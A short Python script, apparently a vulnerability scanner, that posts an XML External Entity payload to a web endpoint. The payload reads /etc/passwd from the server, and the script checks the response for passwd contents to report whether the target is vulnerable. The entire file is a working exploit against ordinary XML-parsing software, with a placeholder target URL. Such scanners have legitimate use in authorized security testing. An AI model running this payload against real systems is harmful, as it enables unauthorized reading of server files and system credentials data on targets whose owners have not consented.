import requests

def scan_xxe(url):
    # The XXE payload
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>
    """

    # The headers for the request
    headers = {
        "Content-Type": "application/xml"
    }

    # Send the POST request with the XXE payload
    response = requests.post(url, data=xxe_payload, headers=headers)

    # Check if the response contains the contents of /etc/passwd
    if "/bin/bash" in response.text or "root:x:" in response.text:
        description = "The application is vulnerable to XXE. /etc/passwd contents found in the response."
        return True, description
    else:
        description = "The application is not vulnerable to XXE or the payload did not succeed."
        return False, description

def main():
    # Example usage
    url = "https://vulnerable-website.com/stock"
    result, description = scan_xxe(url)
    print(f"Result: {result}, Description: {description}")

if __name__ == "__main__":
    main()
